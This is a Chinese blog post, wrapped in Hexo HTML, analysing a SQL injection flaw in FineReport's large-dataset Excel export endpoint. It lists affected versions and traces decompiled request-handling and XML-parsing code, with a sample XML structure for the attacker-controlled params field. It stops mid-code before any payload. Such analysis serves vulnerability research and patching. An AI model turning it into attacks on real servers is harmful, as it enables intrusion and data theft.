@@ -1,0 +1,916 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="漏洞版本 FineReport &lt; 11.5.4.1FineBi 7.0.* &lt; 7.0.5 FineBi 6.1.* &lt; 6.1.8 FineBi 6.0.* &lt; 6.0.24 FineDataLink 5.0.* &lt; 5.0.4.3 FineDataLink 4.0.* &lt; 4.2.11.3  漏洞分析鉴权分析根据漏洞情报，漏洞路由位于&#x2F;webroot&#x2F;de">
+<meta property="og:type" content="article">
+<meta property="og:title" content="帆软报表 export／excel SQL注入分析（上）">
+<meta property="og:url" content="http://example.com/2026/02/16/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20export%EF%BC%8Fexcel%20SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="漏洞版本 FineReport &lt; 11.5.4.1FineBi 7.0.* &lt; 7.0.5 FineBi 6.1.* &lt; 6.1.8 FineBi 6.0.* &lt; 6.0.24 FineDataLink 5.0.* &lt; 5.0.4.3 FineDataLink 4.0.* &lt; 4.2.11.3  漏洞分析鉴权分析根据漏洞情报，漏洞路由位于&#x2F;webroot&#x2F;de">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/assets/image-20260316172447-yik49z6.png">
+<meta property="og:image" content="http://example.com/assets/image-20260317100923-mfdq34p.png">
+<meta property="og:image" content="http://example.com/assets/image-20260317101617-6c6e05x.png">
+<meta property="og:image" content="http://example.com/assets/image-20260317102039-wv27sdg.png">
+<meta property="og:image" content="http://example.com/assets/image-20260317102348-o6qt17r.png">
+<meta property="og:image" content="http://example.com/assets/image-20260317155349-o6xp3es.png">
+<meta property="og:image" content="http://example.com/assets/image-20260317155517-pf647g4.png">
+<meta property="og:image" content="http://example.com/assets/image-20260317175401-wpjp4he.png">
+<meta property="og:image" content="http://example.com/assets/image-20260317175444-4o2jw36.png">
+<meta property="og:image" content="http://example.com/assets/20251219111825-6164d386-dc89-1-20260317172554-al5itw8.png">
+<meta property="article:published_time" content="2026-02-16T10:30:00.000Z">
+<meta property="article:modified_time" content="2026-03-18T01:56:10.212Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="安全研究">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/assets/image-20260316172447-yik49z6.png">
+  
+  
+  
+  <title>帆软报表 export／excel SQL注入分析（上） - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Change</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="帆软报表 export／excel SQL注入分析（上）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-02-16 18:30" pubdate>
+          2026年2月16日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          17k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          144 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">帆软报表 export／excel SQL注入分析（上）</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h1><ul>
+<li>FineReport &lt; 11.5.4.1FineBi 7.0.* &lt; 7.0.5</li>
+<li>FineBi 6.1.* &lt; 6.1.8</li>
+<li>FineBi 6.0.* &lt; 6.0.24</li>
+<li>FineDataLink 5.0.* &lt; 5.0.4.3</li>
+<li>FineDataLink 4.0.* &lt; 4.2.11.3</li>
+</ul>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="鉴权分析"><a href="#鉴权分析" class="headerlink" title="鉴权分析"></a>鉴权分析</h2><p>根据漏洞情报，漏洞路由位于<code>/webroot/decision/nx/report/v9/largedataset/export/excel</code>，根据代码可以发现，传入的参数由</p>
+<p>​<code>LargeDatasetExcelExportHandler</code>类的静态实例的Handler方法接收</p>
+<p><img src="/assets/image-20260316172447-yik49z6.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>跟进看一下是怎么处理传入的参数的，跟进发现转到了另一个类的handle方法，这里转换了一下线程名，然后继续调用父类的handle进行处理</p>
+<p><img src="/assets/image-20260317100923-mfdq34p.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>这里主要是处理资源初始化、GZIP 压缩、异常分类之类的，我们主要关注断点处的handleRequest方法</p>
+<p><img src="/assets/image-20260317101617-6c6e05x.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>获取seesion，看样子应该需要要检查请求包中的sessionID来鉴权</p>
+<p><img src="/assets/image-20260317102039-wv27sdg.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="/assets/image-20260317102348-o6qt17r.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>回到<code>LargeDatasetExcelExportHandler</code>​的dohandle，根据sessionId获取模板信息，同时初始化一个<code>Calculator</code>​，这里的<code>Calculator</code>指的是帆软的计算引擎，负责公式求值、参数解析之类的，接着initCreator初始化导出数据创建器，这部分会设计到参数解析，然后执行导出，我们主要关注initCreator，参数解析这部分的代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//LargeDatasetExcelExportHandler</span><br>   protected <span class="hljs-type">void</span> <span class="hljs-title function_">doHandle</span><span class="hljs-params">(HttpServletRequest var1, HttpServletResponse var2, String var3)</span> throws Exception &#123;<br>       TemplateSessionIDInfo var4 = (TemplateSessionIDInfo)SessionPoolManager.getSessionIDInfor(var3, TemplateSessionIDInfo.class);<br>       Calculator var5 = this.getCalculatorFromPara(var1, var2, var3);<br><br>       try &#123;<br>           WorkbookDataCreator var6 = this.initCreator(var5, var1, var2, var4);<br>           DirectExcelExportPool.getInstance().export(var6, var2.getOutputStream());  <span class="hljs-comment">//执行导出</span><br>           MetricRegistry.getMetric().submit(FocusPoint.newBuilder().id(<span class="hljs-string">&quot;function_plugin_com.export.ds&quot;</span>).text(var4.getRelativePath()).source(Original.EMBED).username(var4.getWebContext().getUserName()).ip(WebUtils.getIpAddr(var1)).build());<br>       &#125; finally &#123;<br>           ExportSessionManager.getInstance().removeExportSession(var3, <span class="hljs-string">&quot;excel&quot;</span>);<br>       &#125;<br><br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<p>这部分就比较重要了，var2是我们的请求包，里面的参数可以由我们控制，关注var2参与了什么逻辑</p>
+<ol>
+<li>从请求中获取 <code>__parameters__</code>​ 参数值（可能是 JSON 字符串），调用 <code>getParamsMap(var5)</code> 解析为 Map</li>
+<li>​<code>getEntity</code>​ 解析 XML 格式的 <code>params</code>​ 参数，构建 <code>LargeDatasetExcelExportJavaScript</code> 对象</li>
+<li>调用 <code>this.dealParam(var11, var1, var7, var2, var4, var6)</code>：处理参数</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//LargeDatasetExcelExportHandler </span><br>  private WorkbookDataCreator <span class="hljs-title function_">initCreator</span><span class="hljs-params">(Calculator var1, HttpServletRequest var2, HttpServletResponse var3, TemplateSessionIDInfo var4)</span> throws Exception &#123;<br>        String var5 = WebUtils.getHTTPRequestParameter(var2, <span class="hljs-string">&quot;__parameters__&quot;</span>);<br>        Map var6 = this.getParamsMap(var5);<br>        LargeDatasetExcelExportJavaScript var7 = this.getEntity(var2);<br>        String var8 = var7.getFileName();<br>        String var9 = var7.getDsName();<br>        LinkedHashMap var10 = var7.getColNamesMap();<br>        DirectExcelExportModel var11 = new DirectExcelExportModel();<br>        TableDataSource var12 = var4.getTableDataSource();<br>        <span class="hljs-keyword">if</span> (StringUtils.isNotEmpty(var8) &amp;&amp; var8.startsWith(<span class="hljs-string">&quot;=$&quot;</span>)) &#123;<br>            var8 = (String)var6.get(<span class="hljs-string">&quot;__filename__&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (StringUtils.isEmpty(var8)) &#123;<br>            var8 = getDefaultFileName(var2, var4, var9);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var8.endsWith(<span class="hljs-string">&quot;.xlsx&quot;</span>)) &#123;<br>            var8 = var8.substring(<span class="hljs-number">0</span>, var8.lastIndexOf(<span class="hljs-string">&quot;.xlsx&quot;</span>));<br>        &#125;<br><br>        this.setRes(var3, Browser.resolve(var2).getEncodedFileName4Download(var8));<br>        var11.setDataSource(var12);<br>        var11.setSessionID(var4.getSessionID());<br>        <span class="hljs-keyword">if</span> (StringUtils.isEmpty(var9)) &#123;<br>            throw new Exception(<span class="hljs-string">&quot;No datasource name specified for exportation.&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            var11.setDsName(var9);<br>            this.dealParam(var11, var1, var7, var2, var4, var6);<br>            <span class="hljs-keyword">if</span> (!var10.isEmpty()) &#123;<br>                var11.setColNamesMap(var10);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> WorkbookDataCreator.build(var11);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="XML如何构造？解析出来会是什么"><a href="#XML如何构造？解析出来会是什么" class="headerlink" title="XML如何构造？解析出来会是什么"></a>XML如何构造？解析出来会是什么</h2><p>getEntity，获取请求包中的<code>params</code>​参数，并使用xml进行解析，getHTTPRequestParameter可以在query、header、body、cookie等位置获取参数<code>params</code>，这里先new了LargeDatasetExcelExportJavaScript，然后readXMLObject（var3），所以关注LargeDatasetExcelExportJavaScript中readXML的实现来了解xml的构造</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//LargeDatasetExcelExportHandler </span><br>  private LargeDatasetExcelExportJavaScript <span class="hljs-title function_">getEntity</span><span class="hljs-params">(HttpServletRequest var1)</span> throws XMLStreamException &#123;<br>       String var2 = WebUtils.getHTTPRequestParameter(var1, <span class="hljs-string">&quot;params&quot;</span>);<br>       LargeDatasetExcelExportJavaScript var3 = new LargeDatasetExcelExportJavaScript();<br>       XMLableReader var4 = XMLableReader.createXMLableReader(var2);<br>       var4.readXMLObject(var3);<br>       <span class="hljs-keyword">return</span> var3;<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个方法首先调用了一个父类的readXML方法，然后判断有无<code>LargeDatasetExcelExportJS</code>​标签，如果有，从XML 节点中读取 <code>exportFileName</code>​、<code>dsName</code>​、<code>colNames</code> 三个属性，如果没有则设置为空，这段方法需要的xml大概长这样</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;LargeDatasetExcelExportJS exportFileName=<span class="hljs-string">&quot;Ch4nge&quot;</span> dsName=<span class="hljs-string">&quot;test&quot;</span> colNames=<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span> /&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// LargeDatasetExcelExportJavaScript</span><br>  public <span class="hljs-type">void</span> <span class="hljs-title function_">readXML</span><span class="hljs-params">(XMLableReader var1)</span> &#123;<br>       super.readXML(var1);<br>       <span class="hljs-keyword">if</span> (var1.isChildNode()) &#123;<br>           String var2 = var1.getTagName();<br>           <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;LargeDatasetExcelExportJS&quot;</span>.equals(var2)) &#123;<br>               this.setFileName(var1.getAttrAsString(<span class="hljs-string">&quot;exportFileName&quot;</span>, <span class="hljs-string">&quot;&quot;</span>));<br>               this.setDsName(var1.getAttrAsString(<span class="hljs-string">&quot;dsName&quot;</span>, <span class="hljs-string">&quot;&quot;</span>));<br>               String var3 = var1.getAttrAsString(<span class="hljs-string">&quot;colNames&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>               LinkedHashMap var4 = (LinkedHashMap)((JSONObject)JSONFactory.createJSON(JSON.OBJECT, var3)).getMap();<br>               Iterator var5 = var4.entrySet().iterator();<br><br>               <span class="hljs-keyword">while</span>(var5.hasNext()) &#123;<br>                   Map.Entry var6 = (Map.Entry)var5.next();<br>                   <span class="hljs-keyword">if</span> (!(var6.getValue() instanceof String)) &#123;<br>                       var6.setValue(var6.getValue().toString());<br>                   &#125;<br>               &#125;<br><br>               this.setColNamesMap(var4);<br>           &#125;<br>       &#125;<br><br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后查看父类readXML的逻辑，这里会检测标签是否有<code>Parameters</code>​，如果有会进入<code>BaseXMLUtils.readParameters(var1);</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//AbstractJavaScript</span><br>   public <span class="hljs-type">void</span> <span class="hljs-title function_">readXML</span><span class="hljs-params">(XMLableReader var1)</span> &#123;<br>       <span class="hljs-keyword">if</span> (var1.isChildNode() &amp;&amp; <span class="hljs-string">&quot;Parameters&quot;</span>.equals(var1.getTagName())) &#123;<br>           Parameter[] var2 = BaseXMLUtils.readParameters(var1);<br>           this.setParameters(var2);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<p>跟进去，这个方法用于处理不同的参数类型</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//BaseXMLUtils</span><br>   public <span class="hljs-type">static</span> Parameter[] readParameters(XMLableReader var0) &#123;<br>       final ArrayList var1 = new ArrayList();<br>       var0.readXMLObject(new XMLReadable() &#123;<br>           public <span class="hljs-type">void</span> readXML(XMLableReader var1x) &#123;<br>               <span class="hljs-keyword">if</span> (var1x.isChildNode()) &#123;<br>				 <span class="hljs-comment">// 处理内置参数类型，Parameter和MultiFieldParameter</span><br>                   <span class="hljs-keyword">if</span> (var1x.getTagName().equals(<span class="hljs-string">&quot;Parameter&quot;</span>)) &#123;<br>                       var1.add(BaseXMLUtils.readParameter(var1x));<br>                   &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var1x.getTagName().equals(<span class="hljs-string">&quot;MultiFieldParameter&quot;</span>)) &#123;<br>                       var1.add(BaseXMLUtils.readMultiFieldParameter(var1x));<br>                   &#125;<br>				<span class="hljs-comment">// 处理插件扩展参数类型</span><br>                   ExtraClassManagerProvider var2 = (ExtraClassManagerProvider)PluginModule.getAgent(PluginModule.ExtraCore);<br>                   <span class="hljs-keyword">if</span> (var2 != null) &#123;<br>                       Set var3 = var2.getArray(<span class="hljs-string">&quot;Parameter&quot;</span>);<br>                       Iterator var4 = var3.iterator();<br><br>                       <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>                           ParameterProvider var5 = (ParameterProvider)var4.next();<br>                           <span class="hljs-keyword">if</span> (var1x.getTagName().equals(var5.xmlTag())) &#123;<br>                               ParameterProvider var6 = (ParameterProvider)var5.newInstance();<br>                               var1x.readXMLObject(var6);<br>                               var1.add(var6);<br>                           &#125;<br>                       &#125;<br>                   &#125;<br>               &#125;<br><br>           &#125;<br>       &#125;);<br>       <span class="hljs-keyword">return</span> (Parameter[])((Parameter[])var1.toArray(new Parameter[var1.size()]));<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们主要看Parameter参数是如何被处理的,大概流程就是<code>BaseXMLUtils.readParameter</code>​判断参数类型，若为<code>Parameter</code>类型，则调用</p>
+<p>​<code>BaseXMLUtils.readParameter</code>​-&gt;<code>XMLableReader.readXMLObject</code>​-&gt;<code>Parameter.readXML</code></p>
+<p>将xml转到<code>Parameter</code>类来处理</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//BaseXMLUtils</span><br>   public <span class="hljs-type">static</span> Parameter <span class="hljs-title function_">readParameter</span><span class="hljs-params">(XMLableReader var0)</span> &#123;<br>       Parameter var1 = new Parameter();<br>       var0.readXMLObject(var1);<br>       <span class="hljs-keyword">return</span> var1;<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//XMLableReader</span><br>   public Object <span class="hljs-title function_">readXMLObject</span><span class="hljs-params">(XMLReadable xmlObject)</span> &#123;<br>       <span class="hljs-keyword">if</span> (xmlObject == null) &#123;<br>           throw new NullPointerException();<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-type">int</span> cur_deep = this.deep;<br>           this.state = <span class="hljs-number">0</span>;<br>           xmlObject.readXML(this);<br>           this.state = <span class="hljs-number">-1</span>;<br>           <span class="hljs-keyword">if</span> (this.deep &lt; cur_deep) &#123;<br>               <span class="hljs-keyword">return</span> xmlObject;<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               try &#123;<br>                   <span class="hljs-keyword">while</span>(this.xmlEventReader.hasNext()) &#123;<br>                       this.currentEvent = this.xmlEventReader.nextEvent();<br>                       <span class="hljs-keyword">if</span> (this.currentEvent.isStartElement()) &#123;<br>                           ++this.deep;<br>                           this.startElement = this.currentEvent.asStartElement();<br>                           this.state = <span class="hljs-number">1</span>;<br>                           xmlObject.readXML(this);<br>                           this.state = <span class="hljs-number">-1</span>;<br>                       &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (this.currentEvent.isEndElement()) 